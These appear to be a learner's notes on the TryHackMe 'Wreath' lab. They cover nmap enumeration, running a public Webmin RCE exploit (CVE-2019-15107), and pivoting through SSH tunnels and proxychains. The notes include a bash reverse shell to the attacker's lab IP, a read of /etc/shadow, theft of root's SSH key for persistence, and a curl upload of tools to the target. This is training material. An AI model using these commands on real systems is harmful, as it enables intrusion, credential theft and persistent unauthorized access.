# Wreath
- Access the network first, we're currently 10.250.180.2. **Target is 10.200.180.200**
- There are three machines on the network
- There is **at least one public facing webserver**
- There is a self-hosted git server somewhere on the network
- The git server is internal, so Thomas may have pushed sensitive information into it  
- There is a **PC running on the network that has antivirus installed**, meaning we can hazard a guess that this is likely to be Windows
- By the sounds of it this is likely to be the server variant of Windows, which might work in our favour  
- The (assumed) Windows PC cannot be accessed directly from the webserver

**Thomas gave us an IP to work with (shown on the Network Panel at the top of the page). Let's start by performing a port scan on the first 15000 ports of this IP.**
## Enumeration
- nmap through first 15000 ports

![[Pasted image 20251009213712.png]]

**Question** : How many of the first 15000 ports are open on the target?
Command : `nmap -sV -sC 10.200.180.200 -p1-15000`
Answer : 4 (1 of them is closed)

**Question** : What OS does Nmap think is running?
Command : `nmap -sS -sV -O --osscan-guess ip_addr`

![[Pasted image 20251009214051.png]]

Answer : centos

Open the IP in your browser -- what site does the server try to redirect you to?
Answer : https://thomaswreath.thm/

In real life we would perform a "footprinting" phase of the engagement at this point. This essentially involves finding as much public information about the target as possible and noting it down. You never know what could prove useful!

Read through the text on the page. What is Thomas' mobile phone number?
+447821548812

Let's have a look at the highest open port.  

Look back at your service scan results: what server version does Nmap detect as running here?

![[Pasted image 20251009214737.png]]

Answer : MiniServ 1.890 (Webmin httpd)

It appears that this service is vulnerable to an unauthenticated remote code execution exploit!

What is the CVE number for this exploit?
Answer : I searched on google and its CVE-2019-15107

## Exploitation
Start by cloning the repository. This can be done with the following command:

`git clone https://github.com/MuirlandOracle/CVE-2019-15107`  

This creates a local copy of the exploit on our attacking machine. Navigate into the folder then install the required Python libraries:

`cd CVE-2019-15107 && pip3 install -r requirements.txt`  

If this doesn't work, you may need to install pip before downloading the libraries. This can be done with:  
`sudo apt install python3-pip`  

The script should already be executable, but if not, add the executable bit (`chmod +x ./CVE-2019-15107.py`).

Never run an unknown script from the internet! Read through the code and see if you can get an idea of what it's doing. (Don't worry if you aren't familiar with Python -- in this case the exploit was coded by the author of this content and is being run in a lab environment, so you can infer that it isn't malicious. It is, however, good practice to read through scripts before running them).  

Once you're satisfied that the script will do what it says it will, run the exploit against the target!

`./CVE-2019-15107.py TARGET_IP`

![[Pasted image 20251009215841.png]]

- i used `sh -i >& /dev/tcp/10.250.180.2/1234 0>&1` to create a reverse shell

![[Pasted image 20251009222017.png]]

Now for a little post-exploitation!

What is the root user's password hash?
- Command : `cat etc/shadow`

![[Pasted image 20251009222223.png]]

You won't be able to crack the root password hash, but you **might be able to find a certain file that will give you consistent access to the root user account through one of the other services on the box.**
Hm...it should be something related to ssh cuz i rmb using the hash to login

What is the full path to this file?
Answer : /root/.ssh/id_rsa

![[Pasted image 20251009222537.png]]

![[Pasted image 20251009222708.png]]

Download the key (copying and pasting it to a file on your own Attacking Machine works), then use the command `chmod 600 KEY_NAME` (substituting in the name of the key) to obtain persistent access to the box.

![[Pasted image 20251009223019.png]]

We have everything we need for now. Let's move on to the next section: Pivoting!

## Pivoting
**Topics**
- Proxychains & Foxyproxy
- SSH Tunneling / Port Forwarding
- plink.exe
- Socat
- Chisel
- sshuttle
There are two main methods encompassed in this area of pentesting:

- **Tunnelling/Proxying:** Creating a proxy type connection through a compromised machine in order to route all desired traffic into the targeted network. This could potentially also be _tunnelled_ inside another protocol (e.g. SSH tunnelling), which can be useful for evading a basic **I**ntrusion **D**etection **S**ystem (IDS) or firewall  
- **Port Forwarding:** Creating a connection between a local port and a single port on a target, via a compromised host

A proxy is good if we want to redirect lots of different kinds of traffic into our target network -- for example, with an nmap scan, or to access multiple ports on multiple different machines.

Port Forwarding tends to be faster and more reliable, but only allows us to access a single port (or a small range) on a target device.

The remaining tasks in this section will cover the following topics:
- Enumerating a network using native and statically compiled tools
- Proxychains / FoxyProxy
- SSH port forwarding and tunnelling (primarily Unix)
- plink.exe (Windows)
- socat (Windows and Unix)  
- chisel (Windows and Unix)
- sshuttle (currently Unix only)

**Questions**
Which type of pivoting creates a channel through which information can be sent hidden inside another protocol?
- Answer : Tunnelling
**Research:** Not covered in this Network, but good to know about. Which Metasploit Framework Meterpreter command can be used to create a port forward?
- Answer : portfwd

Information is power -- the more we know about our target, the more options we have available to us. As such, our first step when attempting to pivot through a network is to get an idea of what's around us.

**There are five possible ways to enumerate a network through a compromised host:**
1. Using material found on the machine. The hosts file or ARP cache, for example  
2. Using pre-installed tools  
3. Using statically compiled tools
4. Using scripting techniques
5. Using local tools through a proxy

Before anything else though, it's sensible to check to see if there are any pieces of useful information stored on the target. `arp -a` can be used to Windows or Linux to check the ARP cache of the machine -- this will show you **any IP addresses of hosts that the target has interacted with recently.** 

Equally, static mappings may be found in `/etc/hosts` on Linux, or `C:\Windows\System32\drivers\etc\hosts` on Windows. 

`/etc/resolv.conf` on Linux may also identify **any local DNS servers**, which may be misconfigured to allow something like a DNS zone transfer attack (which is outwith the scope of this content, but worth looking into).
Linux has an equivalent command as an alternative to reading the resolv.conf file: `nmcli dev show`.

On Windows the easiest way to check the DNS servers for an interface is with `ipconfig /all`. 

Ideally a tool like Nmap will already be installed on the target; however, this is not always the case (indeed, you'll find that Nmap is **not** installed on the currently compromised server of the Wreath network). If this happens, it's worth looking into whether you can use an installed shell to perform a sweep of the network. 

For example, the following **Bash one-liner would perform a full ping sweep of the 192.168.1.x network:**

`for i in {1..255}; do (ping -c 1 192.168.1.${i} | grep "bytes from" &); done`

The above command generates a full list of numbers from 1 to 255 and loops through it. For each number, it sends one ICMP ping packet to 192.168.1.x as a backgrounded job (meaning that each ping runs in parallel for speed)

If you suspect that a host is active but is blocking ICMP ping requests, you could also **check some common ports** using a tool like netcat.

**Question**
What is the absolute path to the file containing DNS entries on Linux?
- Answer : /etc/resolv.conf
What is the absolute path to the hosts file on Windows?
- Answer : C:\Windows\System32\drivers\etc\hosts
How could you see which IP addresses are active and allow ICMP echo requests on the 172.16.0.x/24 network using Bash?
- Answer : for i in {1..255}; do (ping -c 1 172.16.0.${i} | grep "bytes from" &); done

### Pivoting 1 : Proxychains & Foxyproxy
**Proxychains**  
Proxychains can often slow down a connection: performing an nmap scan through it is especially hellish. Ideally you should try to use static tools where possible, and route traffic through proxychains only when required.

That said, let's take a look at the tool itself.

Proxychains is a command line tool which is activated by prepending the command `proxychains` to other commands. For example, to **proxy netcat  through a proxy**, you could use the command:  
`proxychains nc 172.16.0.10 23`  

Notice that a proxy port was not specified in the above command. This is because proxychains reads its options from a config file. The master config file is located at `/etc/proxychains.conf`. This is where proxychains will look by default; however, it's actually the last location where proxychains will look. The locations (in order) are:

1. The current directory (i.e. `./proxychains.conf`)
2. `~/.proxychains/proxychains.conf`
3. `/etc/proxychains.conf`

This makes it extremely easy to configure proxychains for a specific assignment, without altering the master file. Simply execute: `cp /etc/proxychains.conf .`

![[Pasted image 20251009225654.png]]

It is here that we can choose which port(s) to forward the connection through. **By default there is one proxy set to localhost port 9050 -- this is the default port for a Tor entrypoint, should you choose to run one on your attacking machine.**

There is one other line in the Proxychains configuration that is worth paying attention to, specifically related to the Proxy DNS settings:  

![Screenshot showing the proxy_dns line in the Proxychains config](https://assets.tryhackme.com/additional/wreath-network/3af17f6ddafc.png)

If performing an Nmap scan through proxychains, this option can cause the scan to hang and ultimately crash. Comment out the `proxy_dns` line using a hashtag (`#`) at the start of the line before performing a scan through the proxy!  

![Proxy_DNS line commented out with a hashtag](https://assets.tryhackme.com/additional/wreath-network/557437aec525.png)

Other things to note when scanning through proxychains:

- You can only use TCP scans -- so no UDP or SYN scans. ICMP Echo packets (Ping requests) will also not work through the proxy, so use the  `-Pn`  switch to prevent Nmap from trying it.
- It will be _extremely_ slow. Try to only use Nmap through a proxy when using the NSE (i.e. use a static binary to see where the open ports/hosts are before proxying a local copy of nmap to use the scripts library).

**FoxyProxy**
Proxychains is an acceptable option when working with CLI tools, but if working in a web browser to access a webapp through a proxy, there is a better option available, namely: FoxyProxy!

People frequently use this tool to manage their BurpSuite/ZAP proxy quickly and easily, but it can also be used alongside the tools we'll be looking at in subsequent tasks in order to access web apps on an internal network.

**Questions**
What line would you put in your proxychains config file to redirect through a socks4 proxy on 127.0.0.1:4242?
Answer : socks4 127.0.0.1 4242

What command would you use to telnet through a proxy to 172.16.0.100:23?
Answer : `proxychains telnet 172.16.0.100 23`

You have discovered a webapp running on a target inside an isolated network. Which tool is more apt for proxying to a webapp: Proxychains (PC) or FoxyProxy (FP)?
Answer : FoxyProxy

### Pivoting 2 : SSH Tunneling / Port Forwarding
**Forward Connections**
Creating a forward (or "local") SSH tunnel **can be done from our attacking box when we have SSH access to the target.** 
As such, this technique is much **more commonly used against Unix hosts**. Linux servers, in particular, commonly have SSH active and open. 
That said, Microsoft (relatively) **recently brought out their own implementation of the OpenSSH server**, native to Windows, so this technique may begin to get more popular in this regard if the feature were to gain more traction.

There are two ways to **create a forward SSH tunnel using the SSH client -- port forwarding**, and creating a proxy.

- Port forwarding is accomplished with the `-L` switch, which **creates a link to a Local port.** For example, if we had SSH access to 172.16.0.5 and there's a webserver running on 172.16.0.10, we could use this command to create a link to the server on 172.16.0.10:  
    `ssh -L 8000:172.16.0.10:80 user@172.16.0.5 -fN`  
- We could then access the website on 172.16.0.10 (through 172.16.0.5) by navigating to port 8000 _on our own_ _attacking machine._ For example, by entering `localhost:8000` into a web browser.
- Using this technique we have effectively **created a tunnel between port 80 on the target server, and port 8000 on our own box**. 
- Note that it's good practice to use a high port, out of the way, for the local connection. This means that the low ports are still open for their correct use (e.g. if we wanted to start our own webserver to serve an exploit to a target), and also means that we do not need to use `sudo` to create the connection. The `-fN` combined switch does two things: `-f` backgrounds the shell immediately so that we have our own terminal back. `-N` tells SSH that it doesn't need to execute any commands -- only set up the connection.  
- Proxies are made using the `-D` switch, for example: `-D 1337`. This will open up port 1337 on your attacking box as a proxy to send data through into the protected network. This is useful when combined with a tool such as proxychains. An example of this command would be:  
    `ssh -D 1337 user@172.16.0.5 -fN`  
    This again uses the `-fN` switches to background the shell. The choice of port 1337 is completely arbitrary -- all that matters is that the port is available and correctly set up in your proxychains (or equivalent) configuration file. Having this proxy set up would allow us to route all of our traffic through into the target network
    
**Reverse Connections**  
Reverse connections are very possible with the SSH client (and indeed may be preferable if you have a shell on the compromised server, but not SSH access). They are, however, riskier as you inherently must access your attacking machine _from_ the target -- be it by using credentials, or preferably a key based system. 
Before we can make a reverse connection safely, there are a few steps we need to take:
1. First, generate a new set of SSH keys and store them somewhere safe (`ssh-keygen`)

![[Pasted image 20251009231331.png]]

This will create two new files: a private key, and a public key.
2. Copy the contents of the public key (the file ending with `.pub`), then edit the `~/.ssh/authorized_keys` file **on your own attacking machine**. You may need to create the `~/.ssh` directory and `authorized_keys` file first.
3. On a new line, type the following line, then paste in the public key:  
    `command="echo 'This account can only be used for port forwarding'",no-agent-forwarding,no-x11-forwarding,no-pty`  
    This makes sure that the key can only be used for port forwarding, disallowing the ability to gain a shell on your attacking machine.

The final entry in the `authorized_keys` file should look something like this:

![[Pasted image 20251009231509.png]]

Next. check if the SSH server on your attacking machine is running:  
`sudo systemctl status ssh`

If the status command indicates that the server is not running then you can start the ssh service with:  
`sudo systemctl start ssh`

The only thing left is to do the unthinkable: **transfer the private key to the target box.** This is usually an absolute no-no, **which is why we generated a throwaway set of SSH keys to be discarded as soon as the engagement is over.**

With the key transferred, we can then **connect back with a reverse port forward** using the following command:  
`ssh -R LOCAL_PORT:TARGET_IP:TARGET_PORT USERNAME@ATTACKING_IP -i KEYFILE -fN   `

To put that into the context of our fictitious IPs: 172.16.0.10 and 172.16.0.5, if we have a shell on 172.16.0.5 and want to give our attacking box (172.16.0.20) access to the webserver on 172.16.0.10, we could use this command on the 172.16.0.5 machine:  
`ssh -R 8000:172.16.0.10:80 kali@172.16.0.20 -i KEYFILE -fN   `

This would open up a port forward to our Kali box, **allowing us to access the 172.16.0.10 webserver**, in exactly the same way as with the forward connection we made before!

In newer versions of the SSH client, it is also possible to create a reverse proxy (the equivalent of the `-D` switch used in local connections). This may not work in older clients, but this command **can be used to create a reverse proxy in clients which do support it**:  
`ssh -R 1337 USERNAME@ATTACKING_IP -i KEYFILE -fN`  
This, again, will open up a proxy allowing us to redirect all of our traffic through localhost port 1337, into the target network.

To close any of these connections, type `ps aux | grep ssh` into the terminal of the machine that created the connection:
Find the process ID (PID) of the connection. Then type `sudo kill PID` to close the connection

**Questions**
If you're connecting to an SSH server _from_ your attacking machine to create a port forward, would this be a local (L) port forward or a remote (R) port forward?
- Answer : L
Which switch combination can be used to background an SSH port forward or tunnel?
- Answer : -fN
It's a good idea to enter our own password on the remote machine to set up a reverse proxy
- Answer : No
What command would you use to create a pair of throwaway SSH keys for a reverse connection?
- Answer : ssh-keygen
If you wanted to set up a reverse portforward from port 22 of a remote machine (172.16.0.100) to port 2222 of your local machine (172.16.0.200), using a keyfile called `id_rsa` and backgrounding the shell, what command would you use? (Assume your username is "kali")
- Answer : `ssh -R 2222:172.16.0.100:22 kali@172.16.0.200 -i id_rsa -fN`
What command would you use to set up a forward proxy on port 8000 to user@target.thm, backgrounding the shell?
- Answer : `ssh -D 8000 user@target.thm -fN`
If you had SSH access to a server (172.16.0.50) with a webserver running internally on port 80 (i.e. only accessible to the server itself on 127.0.0.1:80), how would you forward it to port 8000 on your attacking machine? Assume the username is "user", and background the shell.
- Answer : `ssh -L 8000:127.0.0.1:80 user@172.16.0.50 -fN`

## Enumeration for internal network
Download a [static nmap binary](https://github.com/andrew-d/static-binaries/raw/master/binaries/linux/x86_64/nmap). Rename it to `nmap-USERNAME`. Finally, upload it to the target in a manner of your choosing.

**For example, with a Python webserver:-**
On Kali (inside the directory containing your Nmap binary):
`sudo python3 -m http.server 80`

Then, on the target:
`curl ATTACKING_IP/nmap-USERNAME -o /tmp/nmap-USERNAME && chmod +x /tmp/nmap-USERNAME`

Now use the binary to scan the network. The command will look something like this:
`./nmap-USERNAME -sn 10.x.x.1-255 -oN scan-USERNAME`
This example : `./helloworld -sn 10.200.180.1-255 -oN scan-helloworld`

![[Pasted image 20251009234652.png]]

Excluding the out of scope hosts, and the current host (`.200`), how many hosts were discovered active on the network?
- Answer : 2 (excluding gateway, .200, 250)

Scan the hosts -- which one does _not_ return a status of "filtered" for every port (submit the last octet only)?

![[Pasted image 20251009235643.png]]

- Answer : 150

Let's assume that the **other host is inaccessible from our current position in the network.**

Which TCP ports (in ascending order, comma separated) below port 15000, are open on the remaining target?
- Answer : 80,3389,5985

We cannot currently perform a service detection scan on the target without first setting up a proxy, so for the time being, let's assume that the services Nmap has identified based on their port number are accurate. (Please feel free to experiment with other scan types through a proxy after completing the pivoting section).

Assuming that the service guesses made by Nmap are accurate, which of the found services is more likely to contain an exploitable vulnerability?

## Pivoting (real)
Thinking about the interesting service on the next target that we discovered in the previous task, pick a pivoting technique and use it to connect to this service, using the web browser on your attacking machine!

What is the name of the program running the service?
